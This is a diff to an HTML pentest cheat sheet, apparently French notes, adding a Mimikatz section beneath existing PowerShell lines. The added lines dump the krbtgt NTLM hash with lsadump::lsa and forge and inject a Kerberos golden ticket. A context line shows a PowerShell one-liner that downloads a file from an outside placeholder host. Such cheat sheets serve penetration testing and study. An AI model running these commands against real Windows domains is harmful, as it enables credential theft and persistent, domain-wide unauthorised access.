@@ -15,3 +15,8 @@
 <h2>Powershell</h2>
 <i>{(New-Object System.Net.WebClient).DownloadFile("http://site.com/file", "C:\\Users\Public\file")}</i> → Wget en powershell</br>
 get-WmiObject -class Win32_Share
+
+<h2>Mimikatz</h2>
+privilege::debug</br>
+lsadump::lsa /inject /name:krbtgt → Récupérer le NTLM hash de krbtgt</br>
+kerberos::golden /user:USER /domain:DOMAIN.LOCAL /sid:<SID de USER> /krbtgt:<NTLM hash de krbtgt> /ticket:evil.tck /ptt → Créé et inject un golden ticket à la session</br>
